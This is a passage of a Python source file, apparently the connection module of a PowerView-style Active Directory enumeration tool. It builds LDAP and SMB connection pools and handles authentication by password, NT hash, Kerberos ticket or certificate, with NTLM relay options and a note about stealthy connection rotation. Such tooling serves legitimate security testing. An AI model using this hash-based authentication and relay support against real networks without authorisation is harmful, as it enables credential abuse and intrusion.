#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb3structs import FILE_READ_DATA, FILE_WRITE_DATA
from impacket.dcerpc.v5 import samr, epm, transport, rpcrt, rprn, srvs, wkst, scmr, drsuapi
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.dtypes import NULL
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp
from impacket.uuid import uuidtup_to_bin
# for relay used
from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
from impacket.examples.ntlmrelayx.clients.ldaprelayclient import LDAPRelayClient
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_UNICODE
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError

from powerview.utils.helpers import (
	get_machine_name,
	host2ip,
	ip2host,
	is_valid_fqdn,
	dn2domain,
	is_ipaddress,
	get_principal_dc_address,
	get_system_nameserver,
	is_proxychains
)
from powerview.lib.resolver import (
	LDAP,
	TRUST,
	EXCHANGE
)
from powerview.utils.certificate import (
	load_pfx,
	key_to_pem,
	cert_to_pem
)
import random
import ssl
import threading
from collections import OrderedDict
import time
import ldap3
import logging
import json
import sys
from struct import unpack
import tempfile
import socket

from ldap3.operation import bind
from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
import powerview.lib.adws as adws

class ConnectionPoolEntry:
	"""Represents a single connection entry in the pool with metadata"""
	
	def __init__(self, connection, domain, created_time=None):
		self.connection = connection
		self.domain = domain.lower()
		self.created_time = created_time or time.time()
		self.last_used = time.time()
		self.use_count = 0
		self.is_healthy = True
		self._lock = threading.RLock()
	
	def mark_used(self):
		"""Mark this connection as recently used"""
		with self._lock:
			self.last_used = time.time()
			self.use_count += 1
	
	def is_alive(self):
		"""Check if the underlying connection is still alive"""
		with self._lock:
			if not self.is_healthy:
				return False
			try:
				return self.connection.is_connection_alive()
			except Exception:
				self.is_healthy = False
				return False
	
	def close(self):
		"""Close the underlying connection"""
		with self._lock:
			self.is_healthy = False
			try:
				if hasattr(self.connection, 'close'):
					self.connection.close()
			except Exception as e:
				logging.debug(f"Error closing connection for {self.domain}: {str(e)}")

class ConnectionPool:
	"""
	Advanced connection pool for managing domain connections with:
	- Keep-alive mechanism to maintain connections (disabled by default, enabled when keepalive_interval is set)
	- Connection attempt rate limiting
	- LRU eviction policy
	- Thread-safe operations
	- Background maintenance (disabled by default, enabled when intervals are set)
	"""
	
	def __init__(self, max_connections=10, cleanup_interval=0, keepalive_interval=0):
		self.max_connections = max_connections
		self.cleanup_interval = cleanup_interval
		self.keepalive_interval = keepalive_interval
		self._shutdown_in_progress = False
		self._pool_type = 'LDAP'
		
		self._pool = OrderedDict()
		self._pool_lock = threading.RLock()
		
		self._connection_attempts = {}
		self._max_connection_attempts = 3
		self._attempt_reset_time = 300
		
		self._cleanup_thread = None
		self._keepalive_thread = None
		self._shutdown_event = threading.Event()
		self._start_maintenance_threads()
	
	def _start_maintenance_threads(self):
		"""Start the background maintenance threads"""
		if self.cleanup_interval > 0 and (self._cleanup_thread is None or not self._cleanup_thread.is_alive()):
			self._cleanup_thread = threading.Thread(
				target=self._cleanup_worker,
				daemon=True,
				name="ConnectionPool-Cleanup"
			)
			self._cleanup_thread.start()
			logging.debug(f"[ConnectionPool] Started {self._pool_type} connection pool cleanup thread")
		
		if self.keepalive_interval > 0 and (self._keepalive_thread is None or not self._keepalive_thread.is_alive()):
			self._keepalive_thread = threading.Thread(
				target=self._keepalive_worker,
				daemon=True,
				name="ConnectionPool-KeepAlive"
			)
			self._keepalive_thread.start()
			logging.debug(f"[ConnectionPool] Started {self._pool_type} connection pool keep-alive thread")
	
	def _cleanup_worker(self):
		"""Background worker that periodically cleans up expired connections"""
		while not self._shutdown_event.wait(self.cleanup_interval):
			try:
				self._cleanup_expired_connections()
				self._reset_connection_attempts()
			except Exception as e:
				logging.debug(f"[ConnectionPool] Error in {self._pool_type} connection pool cleanup: {str(e)}")
	
	def _keepalive_worker(self):
		"""Background worker that periodically sends keep-alive to maintain connections"""
		while not self._shutdown_event.wait(self.keepalive_interval):
			try:
				self._perform_keepalive()
			except Exception as e:
				logging.debug(f"[ConnectionPool] Error in {self._pool_type} connection pool keep-alive: {str(e)}")
	
	def _perform_keepalive(self):
		"""Send keep-alive to all active connections to maintain them"""
		keepalive_domains = []
		dead_domains = []
		
		with self._pool_lock:
			for domain, entry in list(self._pool.items()):
				keepalive_domains.append((domain, entry))
		
		for domain, entry in keepalive_domains:
			try:
				if hasattr(entry.connection, 'keep_alive'):
					success = entry.connection.keep_alive()
					if success:
						entry.mark_used()
					else:
						dead_domains.append(domain)
						logging.debug(f"[ConnectionPool] {self._pool_type} connection keep-alive failed for domain: {domain}")
				else:
					if entry.is_alive():
						entry.mark_used()
					else:
						dead_domains.append(domain)
						logging.debug(f"[ConnectionPool] {self._pool_type} connection dead during keep-alive for domain: {domain}")
			except Exception as e:
				dead_domains.append(domain)
				logging.debug(f"[ConnectionPool] {self._pool_type} keep-alive error for domain {domain}: {str(e)}")
		
		if dead_domains:
			with self._pool_lock:
				for domain in dead_domains:
					if domain in self._pool:
						entry = self._pool.pop(domain)
						entry.close()
						logging.debug(f"[ConnectionPool] {self._pool_type} removed dead connection for domain: {domain}")
	
	def _cleanup_expired_connections(self):
		"""Remove only truly dead connections from the pool"""
		dead_domains = []
		
		with self._pool_lock:
			for domain, entry in list(self._pool.items()):
				if not entry.is_alive():
					dead_domains.append(domain)
			
			for domain in dead_domains:
				if domain in self._pool:
					entry = self._pool.pop(domain)
					entry.close()
					logging.debug(f"[ConnectionPool] {self._pool_type} removed dead connection for domain: {domain}")
	
	def _reset_connection_attempts(self):
		"""Reset connection attempt counters for domains after timeout"""
		current_time = time.time()
		domains_to_reset = []
		
		for domain, (attempts, last_attempt_time) in list(self._connection_attempts.items()):
			if (current_time - last_attempt_time) > self._attempt_reset_time:
				domains_to_reset.append(domain)
		
		for domain in domains_to_reset:
			if domain in self._connection_attempts:
				del self._connection_attempts[domain]
				logging.debug(f"[ConnectionPool] {self._pool_type} reset connection attempts for domain: {domain}")
	
	def _can_attempt_connection(self, domain):
		"""Check if we can attempt a connection to the domain (rate limiting)"""
		current_time = time.time()
		if domain in self._connection_attempts:
			attempts, last_attempt_time = self._connection_attempts[domain]
			if attempts >= self._max_connection_attempts and (current_time - last_attempt_time) < 60:
				return False
		return True
	
	def _record_connection_attempt(self, domain, success=False):
		"""Record a connection attempt (success or failure)"""
		current_time = time.time()
		if success:
			if domain in self._connection_attempts:
				del self._connection_attempts[domain]
		else:
			attempts, _ = self._connection_attempts.get(domain, (0, 0))
			self._connection_attempts[domain] = (attempts + 1, current_time)
	
	def get_connection(self, domain, connection_factory):
		"""
		Get a connection for the specified domain, creating one if necessary
		
		Args:
			domain (str): Target domain name
			connection_factory (callable): Function to create new connections
			
		Returns:
			Connection object for the domain
			
		Raises:
			ConnectionError: If connection cannot be established or rate limited
		"""
		domain = domain.lower()
		
		# Check rate limiting
		if not self._can_attempt_connection(domain):
			raise ConnectionError(f"Too many recent failed connection attempts to domain {domain}")
		
		with self._pool_lock:
			if domain in self._pool:
				entry = self._pool[domain]
				if entry.is_alive():
					entry.mark_used()
					self._pool.move_to_end(domain)
					logging.debug(f"[ConnectionPool] {self._pool_type} reusing existing connection for domain: {domain}")
					return entry.connection
				else:
					entry.close()
					del self._pool[domain]
					logging.debug(f"[ConnectionPool] {self._pool_type} removed dead connection for domain: {domain}")
			
			if len(self._pool) >= self.max_connections:
				oldest_domain, oldest_entry = self._pool.popitem(last=False)
				oldest_entry.close()
				logging.debug(f"[ConnectionPool] {self._pool_type} evicted oldest connection for domain: {oldest_domain}")
			
			try:
				new_connection = connection_factory()
				
				if not new_connection.is_connection_alive():
					raise ConnectionError(f"Created connection for {domain} is not alive")
				
				entry = ConnectionPoolEntry(new_connection, domain)
				entry.mark_used()
				self._pool[domain] = entry
				self._record_connection_attempt(domain, success=True)
				
				logging.debug(f"[ConnectionPool] {self._pool_type} created new connection for domain: {domain}")
				return new_connection
				
			except Exception as e:
				self._record_connection_attempt(domain, success=False)
				logging.error(f"Failed to create connection for domain {domain}: {str(e)}")
				raise
	
	def add_connection(self, connection, domain):
		"""Add a connection to the pool with proper validation and management"""
		domain = domain.lower()
		
		with self._pool_lock:
			if domain in self._pool:
				old_entry = self._pool[domain]
				old_entry.close()
				logging.debug(f"[ConnectionPool] {self._pool_type} replaced existing connection for domain: {domain}")
			
			if len(self._pool) >= self.max_connections and domain not in self._pool:
				oldest_domain, oldest_entry = self._pool.popitem(last=False)
				oldest_entry.close()
				logging.debug(f"[ConnectionPool] {self._pool_type} evicted oldest connection for domain: {oldest_domain}")
			
			if not connection.is_connection_alive():
				raise ConnectionError(f"Cannot add dead connection for domain {domain}")
			
			self._pool[domain] = ConnectionPoolEntry(connection, domain)
			logging.debug(f"[ConnectionPool] {self._pool_type} added connection for domain: {domain}")

	def remove_connection(self, domain):
		"""Remove a connection from the pool with proper cleanup"""
		domain = domain.lower()
		with self._pool_lock:
			if domain in self._pool:
				entry = self._pool.pop(domain)
				entry.close()
				logging.debug(f"[ConnectionPool] {self._pool_type} removed connection for domain: {domain}")
			else:
				logging.debug(f"[ConnectionPool] {self._pool_type} no connection found for domain: {domain}")
	
	def get_all_domains(self):
		"""Get list of all domains with active connections"""
		with self._pool_lock:
			return list(self._pool.keys())
	
	def get_pool_stats(self):
		"""Get detailed statistics about the connection pool"""
		with self._pool_lock:
			stats = {
				'total_connections': len(self._pool),
				'max_connections': self.max_connections,
				'failed_attempts': len(self._connection_attempts),
				'domains': {}
			}
			
			for domain, entry in self._pool.items():
				stats['domains'][domain] = {
					'last_used': entry.last_used,
					'use_count': entry.use_count,
					'age': time.time() - entry.created_time,
					'is_alive': entry.is_alive()
				}
			
			return stats
	
	def health_check(self):
		"""Perform a health check on all connections and remove dead ones"""
		dead_domains = []
		
		with self._pool_lock:
			for domain, entry in list(self._pool.items()):
				if not entry.is_alive():
					dead_domains.append(domain)
			
			for domain in dead_domains:
				if domain in self._pool:
					entry = self._pool.pop(domain)
					entry.close()
					logging.debug(f"[ConnectionPool] {self._pool_type} health check removed dead connection for domain: {domain}")
		
		return len(dead_domains)
	
	def shutdown(self):
		"""Shutdown the connection pool and cleanup all resources"""
		if self._shutdown_in_progress:
			return  # Prevent recursive shutdown
		
		self._shutdown_in_progress = True
		logging.debug(f"[ConnectionPool] {self._pool_type} shutting down connection pool...")
		
		try:
			self._shutdown_event.set()
			
			# Only join cleanup thread if it was started
			if hasattr(self, '_cleanup_thread') and self._cleanup_thread and self._cleanup_thread.is_alive():
				self._cleanup_thread.join(timeout=5)
			
			# Only join keepalive thread if it was started
			if hasattr(self, '_keepalive_thread') and self._keepalive_thread and self._keepalive_thread.is_alive():
				self._keepalive_thread.join(timeout=5)
			
			with self._pool_lock:
				for domain, entry in list(self._pool.items()):
					try:
						entry.close()
					except Exception as e:
						logging.debug(f"[ConnectionPool] {self._pool_type} error closing connection for {domain}: {str(e)}")
				self._pool.clear()
			
			logging.debug(f"[ConnectionPool] {self._pool_type} connection pool shutdown complete")
		except Exception as e:
			logging.debug(f"[ConnectionPool] {self._pool_type} error during connection pool shutdown: {str(e)}")
	
	def __del__(self):
		if hasattr(self, '_shutdown_in_progress') and self._shutdown_in_progress:
			return  # Prevent recursive shutdown
		
		try:
			self.shutdown()
		except:
			pass

class SMBConnectionEntry(ConnectionPoolEntry):
	"""Represents a single SMB connection entry in the pool with metadata"""
	
	def __init__(self, connection, host, created_time=None):
		super().__init__(connection, host, created_time)
		self.host = host
		self.last_check_time = time.time()
	
	def is_alive(self, force_check=False):
		"""Check if the underlying SMB connection is still alive"""
		with self._lock:
			if not self.is_healthy:
				return False
			current_time = time.time()
			if force_check or (current_time - self.last_check_time > 60):
				try:
					self.connection._SMBConnection.echo()
					self.last_check_time = current_time
					return True
				except Exception as e:
					self.is_healthy = False
					return False
			return True
	
	def mark_used(self):
		super().mark_used()
		self.last_check_time = time.time()
	
	def close(self):
		"""Close the underlying SMB connection"""
		with self._lock:
			self.is_healthy = False
			try:
				if hasattr(self.connection, 'close'):
					self.connection.close()
			except Exception as e:
				logging.debug(f"[SMBConnectionPool] error closing SMB connection for {self.host}: {str(e)}")

class SMBConnectionPool(ConnectionPool):
	"""
	Specialized connection pool for managing SMB connections with:
	- SMB-specific health checking via listShares()
	- Enhanced keep-alive mechanism for SMB sessions
	- Port fallback support (445 -> 139)
	- Connection rotation for stealth operations
	"""
	
	def __init__(self, max_connections=20, cleanup_interval=400, keepalive_interval=300):
		super().__init__(max_connections, cleanup_interval, keepalive_interval)
		self._pool_type = 'SMB'
	
	def _perform_keepalive(self):
		"""Send keep-alive to all active SMB connections to maintain them"""
		keepalive_hosts = []
		dead_hosts = []
		
		with self._pool_lock:
			for host, entry in list(self._pool.items()):
				keepalive_hosts.append((host, entry))
		
		for host, entry in keepalive_hosts:
			try:
				if entry.is_alive(force_check=True):
					entry.mark_used()
					# logging.debug(f"SMB connection alive for host: {host}")
				else:
					dead_hosts.append(host)
					logging.debug(f"[SMBConnectionPool] {self._pool_type} SMB connection dead during keep-alive for host: {host}")
			except Exception as e:
				dead_hosts.append(host)
				logging.debug(f"[SMBConnectionPool] {self._pool_type} SMB keep-alive error for host {host}: {str(e)}")
		
		if dead_hosts:
			with self._pool_lock:
				for host in dead_hosts:
					if host in self._pool:
						entry = self._pool.pop(host)
						entry.close()
						logging.debug(f"[SMBConnectionPool] {self._pool_type} removed dead SMB connection for host: {host}")
	
	def get_connection(self, host, connection_factory, show_exceptions=True):
		"""
		Get an SMB connection for the specified host, creating one if necessary
		
		Args:
			host (str): Target host name or IP
			connection_factory (callable): Function to create new SMB connections
			
		Returns:
			SMBConnection object for the host
			
		Raises:
			ConnectionError: If connection cannot be established or rate limited
		"""
		host = host.lower()
		
		if not self._can_attempt_connection(host):
			raise ConnectionError(f"Too many recent failed SMB connection attempts to host {host}")
		
		with self._pool_lock:
			if host in self._pool:
				entry = self._pool[host]
				if entry.is_alive():
					entry.mark_used()
					self._pool.move_to_end(host)
					logging.debug(f"[SMBConnectionPool] {self._pool_type} reusing existing SMB connection for host: {host}")
					return entry.connection
				else:
					entry.close()
					del self._pool[host]
					logging.debug(f"[SMBConnectionPool] {self._pool_type} removed dead SMB connection for host: {host}")
			
			if len(self._pool) >= self.max_connections:
				oldest_host, oldest_entry = self._pool.popitem(last=False)
				oldest_entry.close()
				logging.debug(f"[SMBConnectionPool] {self._pool_type} evicted oldest SMB connection for host: {oldest_host}")
			
			try:
				new_connection = connection_factory()
				
				entry = SMBConnectionEntry(new_connection, host)
				entry.mark_used()
				self._pool[host] = entry
				self._record_connection_attempt(host, success=True)
				
				logging.debug(f"[SMBConnectionPool] {self._pool_type} created new SMB connection for host: {host}")
				return new_connection
				
			except Exception as e:
				self._record_connection_attempt(host, success=False)
				if show_exceptions:
					logging.error(f"Failed to create SMB connection for host {host}: {str(e)}")
					raise
	
	def add_connection(self, connection, host):
		"""Add an SMB connection to the pool with proper validation and management"""
		host = host.lower()
		
		with self._pool_lock:
			if host in self._pool:
				old_entry = self._pool[host]
				old_entry.close()
				logging.debug(f"[SMBConnectionPool] {self._pool_type} replaced existing SMB connection for host: {host}")
			
			if len(self._pool) >= self.max_connections and host not in self._pool:
				oldest_host, oldest_entry = self._pool.popitem(last=False)
				oldest_entry.close()
				logging.debug(f"[SMBConnectionPool] {self._pool_type} evicted oldest SMB connection for host: {oldest_host}")
			
			self._pool[host] = SMBConnectionEntry(connection, host)
			logging.debug(f"[SMBConnectionPool] {self._pool_type} added SMB connection for host: {host}")

	def remove_connection(self, host):
		"""Remove an SMB connection from the pool with proper cleanup"""
		host = host.lower()
		with self._pool_lock:
			if host in self._pool:
				entry = self._pool.pop(host)
				entry.close()
				logging.debug(f"[SMBConnectionPool] {self._pool_type} removed SMB connection for host: {host}")
			else:
				logging.debug(f"[SMBConnectionPool] {self._pool_type} no SMB connection found for host: {host}")
	
	def get_all_hosts(self):
		"""Get list of all hosts with active SMB connections"""
		with self._pool_lock:
			return list(self._pool.keys())
	
	def get_pool_stats(self):
		"""Get detailed statistics about the SMB connection pool"""
		with self._pool_lock:
			stats = {
				'protocol': 'SMB',
				'total_connections': len(self._pool),
				'max_connections': self.max_connections,
				'failed_attempts': len(self._connection_attempts),
				'hosts': {}
			}
			
			for host, entry in self._pool.items():
				stats['hosts'][host] = {
					'last_used': entry.last_used,
					'use_count': entry.use_count,
					'age': time.time() - entry.created_time,
					'is_alive': entry.is_alive(),
					'last_check_time': entry.last_check_time
				}
			
			return stats

class CONNECTION:
	def __init__(self, args):
		self.args = args
		self._connection_pool = ConnectionPool(
            max_connections=getattr(args, 'max_connections', 10),
            cleanup_interval=getattr(args, 'pool_cleanup_interval', 0),
            keepalive_interval=getattr(args, 'keepalive_interval', 0)
        )
		self._smb_pool = SMBConnectionPool(
			max_connections=20,
			cleanup_interval=400,
			keepalive_interval=300
		)
		self._current_domain = None
		self.username = args.username
		self.password = args.password
		self.domain = args.domain
		self.lmhash = args.lmhash
		self.nthash = args.nthash
		self.use_kerberos = args.use_kerberos
		self.use_simple_auth = args.use_simple_auth
		self.use_ldap = args.use_ldap
		self.use_ldaps = args.use_ldaps
		self.use_gc = args.use_gc
		self.use_gc_ldaps = args.use_gc_ldaps
		self.use_adws = args.use_adws
		self.proto = None
		self.port = args.port
		self.hashes = args.hashes
		self.auth_aes_key = args.auth_aes_key
		if self.auth_aes_key is not None and self.use_kerberos is False:
			self.use_kerberos = True
		self.no_pass = args.no_pass
		if args.nameserver is None and is_ipaddress(args.ldap_address) and not is_proxychains():
			logging.debug(f"Using {args.ldap_address} as nameserver")
			self.nameserver = args.ldap_address
		elif args.nameserver and is_ipaddress(args.nameserver):
			self.nameserver = args.nameserver
		else:
			self.nameserver = None
		self.use_system_ns = args.use_system_ns
		self.stack_trace = args.stack_trace

		self.pfx = args.pfx
		self.pfx_pass = None
		self.do_certificate = True if self.pfx is not None else False

		if self.pfx:
			try:
				with open(self.pfx, "rb") as f:
					pfx = f.read()
			except FileNotFoundError as e:
				logging.error(str(e))
				sys.exit(0)

			try:
				logging.debug("Loading certificate without password")
				self.key, self.cert = load_pfx(pfx)
			except ValueError as e:
				if "Invalid password or PKCS12 data" in str(e):
					logging.warning("Certificate requires password. Supply password")
					from getpass import getpass
					self.pfx_pass = getpass("Password:").encode()
					self.key, self.cert = load_pfx(pfx, self.pfx_pass)
			except Exception as e:
				logging.error(f"Unknown error: {str(e)}")
				sys.exit(0)
		
		# auth method
		self.auth_method = ldap3.NTLM
		if self.use_simple_auth:
			self.auth_method = ldap3.SIMPLE
		elif self.do_certificate or self.use_kerberos:
			self.auth_method = ldap3.SASL

		# relay option
		self.relay = args.relay
		self.relay_host = args.relay_host
		self.relay_port = args.relay_port

		if is_valid_fqdn(args.ldap_address) and not self.use_kerberos:
			_ldap_address = host2ip(args.ldap_address, nameserver=self.nameserver, dns_timeout=5, use_system_ns = self.use_system_ns)
			if not _ldap_address:
				logging.error("Couldn't resolve %s" % args.ldap_address)
				sys.exit(0)
			self.targetIp = _ldap_address
			self.ldap_address = _ldap_address
			args.ldap_address = _ldap_address
		else:
			self.targetIp = args.ldap_address
			self.ldap_address = args.ldap_address

		if args.dc_ip:
			self.dc_ip = args.dc_ip
		else:
			self.dc_ip = self.targetIp
			args.dc_ip = self.dc_ip
	   
		self.kdcHost = self.dc_ip
		self.targetDomain = None
		self.flatname = None

		# if no protocol is specified, use ldaps
		if not self.use_ldap and not self.use_ldaps and not self.use_gc and not self.use_gc_ldaps and not self.use_adws:
			self.use_ldaps = True

		self.args = args
		self.ldap_session = None
		self.ldap_server = None

		self.rpc_conn = None
		self.wmi_conn = None
		self.dcom = None
		self.samr = None
		self.TGT = None
		self.TGS = None

		# stolen from https://github.com/the-useless-one/pywerview/blob/master/pywerview/requester.py#L90
		try:
			if ldap3.SIGN and ldap3.ENCRYPT:
				self.sign_and_seal_supported = True
				logging.debug('LDAP sign and seal are supported')
		except AttributeError:
			self.sign_and_seal_supported = False
			logging.debug('LDAP sign and seal are not supported. Install with "pip install ldap3-bleeding-edge"')

		try:
			if ldap3.TLS_CHANNEL_BINDING:
				self.tls_channel_binding_supported = True
				logging.debug('TLS channel binding is supported')
		except AttributeError:
			self.tls_channel_binding_supported = False
			logging.debug('TLS channel binding is not supported Install with "pip install ldap3-bleeding-edge"')
		self.use_sign_and_seal = self.args.use_sign_and_seal
		self.use_channel_binding = self.args.use_channel_binding
		# check sign and cb is supported
		if self.use_sign_and_seal and not self.sign_and_seal_supported:
			logging.warning('LDAP sign and seal are not supported. Ignoring flag')
			self.use_sign_and_seal = False
		elif self.use_channel_binding and not self.tls_channel_binding_supported:
			logging.warning('Channel binding is not supported. Ignoring flag')
			self.use_channel_binding = False

		if self.use_sign_and_seal and self.use_ldaps:
			if self.args.use_ldaps:
				logging.error('Sign and seal not supported with LDAPS')
				sys.exit(-1)
			logging.warning('Sign and seal not supported with LDAPS. Falling back to LDAP')
			self.use_ldap = True
			self.use_ldaps = False
		elif self.use_channel_binding and self.use_ldap:
			if self.args.use_ldap:
				logging.error('TLS channel binding not supported with LDAP')
				sys.exit(-1)
			logging.warning('Channel binding not supported with LDAP. Proceed with LDAPS')
			self.use_ldaps = True
			self.use_ldap = False

	def add_domain_connection(self, domain):
		"""Add a domain connection to the pool"""
		self._connection_pool.add_connection(self, domain)

	def get_domain_connection(self, domain):
		"""Get or create a connection to a trusted domain using the connection pool"""
		if not domain:
			return self
			
		domain = domain.lower()
		
		if domain == self.get_domain().lower():
			if self.is_connection_alive():
				try:
					self._connection_pool.add_connection(self, domain)
					logging.debug(f"Added primary domain {domain} to pool")
				except Exception as e:
					logging.debug(f"Failed to add primary domain to pool: {str(e)}")
				return self
			else:
				logging.debug("Primary domain connection is dead, creating new one")
		
		def connection_factory():
			"""Factory function to create new domain connections"""
			new_conn = CONNECTION(self.args)
			new_conn.username = self.username
			new_conn.password = self.password
			new_conn.lmhash = self.lmhash
			new_conn.nthash = self.nthash
			new_conn.auth_aes_key = self.auth_aes_key
			if hasattr(self, 'TGT') and self.TGT is not None:
				new_conn.TGT = self.TGT
			if hasattr(self, 'TGS') and self.TGS is not None:
				new_conn.TGS = self.TGS
			new_conn.use_kerberos = self.use_kerberos
			
			new_conn.update_temp_ldap_address(domain)
			
			for attempt in range(3):
				try:
					new_conn.ldap_server, new_conn.ldap_session = new_conn.init_ldap_session()
					if new_conn.is_connection_alive():
						break
				except Exception as e:
					if attempt == 2:
						raise
					logging.debug(f"Connection attempt {attempt+1} to {domain} failed: {str(e)}")
					time.sleep(1)
			
			if not new_conn.is_connection_alive():
				raise ConnectionError(f"Failed to establish working connection to domain {domain}")
			
			return new_conn
		
		# Use the connection pool instead of manual management
		try:
			connection = self._connection_pool.get_connection(domain, connection_factory)
			logging.debug(f"Retrieved connection for domain {domain} from pool")
			return connection
		except Exception as e:
			logging.error(f"Failed to get connection for domain {domain}: {str(e)}")
			raise
	
	def maintain_connections(self):
		"""
		Connection maintenance is handled by the pool's background threads
		If keepalive_interval > 0, the pool automatically maintains connections
		This method can manually trigger maintenance if needed
		"""
		if hasattr(self._connection_pool, 'health_check'):
			dead_count = self._connection_pool.health_check()
			if dead_count > 0:
				logging.debug(f"Manual health check removed {dead_count} dead connections")
		else:
			logging.debug("Connection maintenance is handled automatically by the pool")

	def cleanup_domain_connections(self):
		"""Cleanup all domain connections using the pool"""
		self._connection_pool.shutdown()

	def get_all_connected_domains(self):
		"""Get list of all domains with active connections from the pool"""
		domains = [self.get_domain()]
		domains.extend(self._connection_pool.get_all_domains())
		return domains

	def remove_domain_connection(self, domain):
		"""Remove a domain connection from the pool"""
		self._connection_pool.remove_connection(domain)

	def get_pool_stats(self):
		"""
		Get comprehensive connection pool statistics for all protocols
		
		Returns:
			dict: Combined statistics from LDAP and SMB connection pools
		"""
		stats = {
			'timestamp': time.time(),
			'pools': {}
		}
		
		# Get LDAP connection pool stats
		try:
			ldap_stats = self._connection_pool.get_pool_stats()
			ldap_stats['protocol'] = 'LDAP'
			stats['pools']['ldap'] = ldap_stats
		except Exception as e:
			logging.debug(f"Error getting LDAP pool stats: {str(e)}")
			stats['pools']['ldap'] = {
				'protocol': 'LDAP',
				'error': str(e),
				'total_connections': 0,
				'max_connections': 0,
				'failed_attempts': 0,
				'domains': {}
			}
		
		# Get SMB connection pool stats
		try:
			if hasattr(self, '_smb_pool'):
				smb_stats = self._smb_pool.get_pool_stats()
				stats['pools']['smb'] = smb_stats
			else:
				stats['pools']['smb'] = {
					'protocol': 'SMB',
					'status': 'not_initialized',
					'total_connections': 0,
					'max_connections': 0,
					'failed_attempts': 0,
					'hosts': {}
				}
		except Exception as e:
			logging.debug(f"Error getting SMB pool stats: {str(e)}")
			stats['pools']['smb'] = {
				'protocol': 'SMB',
				'error': str(e),
				'total_connections': 0,
				'max_connections': 0,
				'failed_attempts': 0,
				'hosts': {}
			}
		
		# Calculate combined totals
		stats['summary'] = {
			'total_connections': (
				stats['pools']['ldap'].get('total_connections', 0) + 
				stats['pools']['smb'].get('total_connections', 0)
			),
			'total_max_connections': (
				stats['pools']['ldap'].get('max_connections', 0) + 
				stats['pools']['smb'].get('max_connections', 0)
			),
			'total_failed_attempts': (
				stats['pools']['ldap'].get('failed_attempts', 0) + 
				stats['pools']['smb'].get('failed_attempts', 0)
			),
			'ldap_domains': len(stats['pools']['ldap'].get('domains', {})),
			'smb_hosts': len(stats['pools']['smb'].get('hosts', {})),
			'pool_utilization': {
				'ldap': (
					stats['pools']['ldap'].get('total_connections', 0) / 
					max(stats['pools']['ldap'].get('max_connections', 1), 1) * 100
				),
				'smb': (
					stats['pools']['smb'].get('total_connections', 0) / 
					max(stats['pools']['smb'].get('max_connections', 1), 1) * 100
				)
			}
		}
		
		return stats

	def get_server_info(self, raw=False):
		info = getattr(self.ldap_server, 'info', None)
		if info is None:
			return None
		if raw:
			return info
		return json.loads(info.to_json())

	def get_schema_info(self, raw=False):
		schema = getattr(self.ldap_server, 'schema', None)
		if schema is None:
			return None
		if raw:
			return schema
		return json.loads(schema.to_json())

	def refresh_domain(self):
		try:
			self.domain = dn2domain(self.ldap_server.info.other.get('defaultNamingContext')[0])
		except:
			pass

	def set_flatname(self, flatname):
		self.flatname = flatname

	def get_flatname(self):
		return self.flatname

	def set_domain(self, domain):
		self.domain = domain.lower()

	def get_domain(self):
		info = self.get_server_info()
		if not info:
			return None
		
		raw_info = info.get('raw', {})
		
		ldap_service_name = raw_info.get('ldapServiceName')
		if ldap_service_name and len(ldap_service_name) > 0:
			service_parts = ldap_service_name[0].split('@')
			if len(service_parts) > 1:
				domain = service_parts[1].lower()
				domain_parts = domain.split('.')
				if len(domain_parts) >= 2:
					return '.'.join(domain_parts[-2:])
				return domain
		
		default_naming_context = raw_info.get('defaultNamingContext')
		if default_naming_context and len(default_naming_context) > 0:
			dn = default_naming_context[0]
			domain_parts = []
			for part in dn.split(','):
				if part.strip().upper().startswith('DC='):
					domain_parts.append(part.strip()[3:])
			if domain_parts:
				full_domain = '.'.join(domain_parts).lower()
				parts = full_domain.split('.')
				if len(parts) >= 2:
					return '.'.join(parts[-2:])
				return full_domain
		
		dns_hostname = raw_info.get('dnsHostName')
		if dns_hostname and len(dns_hostname) > 0:
			hostname_parts = dns_hostname[0].split('.')
			if len(hostname_parts) > 2:
				return '.'.join(hostname_parts[-2:]).lower()
			elif len(hostname_parts) > 1:
				return '.'.join(hostname_parts[1:]).lower()
		
		if self.domain:
			parts = self.domain.lower().split('.')
			if len(parts) >= 2:
				return '.'.join(parts[-2:])
		
		return self.domain.lower() if self.domain else None

	def set_targetDomain(self, domain):
		"""
		Set or reset the target domain for cross-domain operations.
		
		Args:
			domain: The target domain name or None to reset to primary domain
		"""
		self.targetDomain = domain
			
	def get_targetDomain(self):
		"""
		Get the current target domain if set for cross-domain operations.
		
		Returns:
			String: The target domain name or None if operating in primary domain
		"""
		return self.targetDomain

	def set_username(self, username):
		self.username = username

	def get_username(self):
		return self.username

	def set_password(self, password):
		self.password = password

	def get_password(self):
		return self.password

	def get_TGT(self):
		return self.TGT

	def set_TGT(self, TGT):
		self.TGT = TGT

	def get_TGS(self):
		return self.TGS

	def set_TGS(self, TGS):
		self.TGS = TGS

	def set_dc_ip(self, dc_ip):
		self.dc_ip = dc_ip

	def get_dc_ip(self):
		return self.dc_ip

	def set_ldap_address(self, ldap_address):
		self.ldap_address = ldap_address

	def get_ldap_address(self):
		return self.ldap_address

	def update_temp_ldap_address(self, server):
		ldap_address = ""
		if self.use_kerberos:
			if is_valid_fqdn(server):
				ldap_address = server
			else:
				logging.error("Kerberos authentication requires a valid FQDN, not an IP address.")
				return None
		
		if is_valid_fqdn(server):
			ldap_address = get_principal_dc_address(
				server, 
				self.nameserver, 
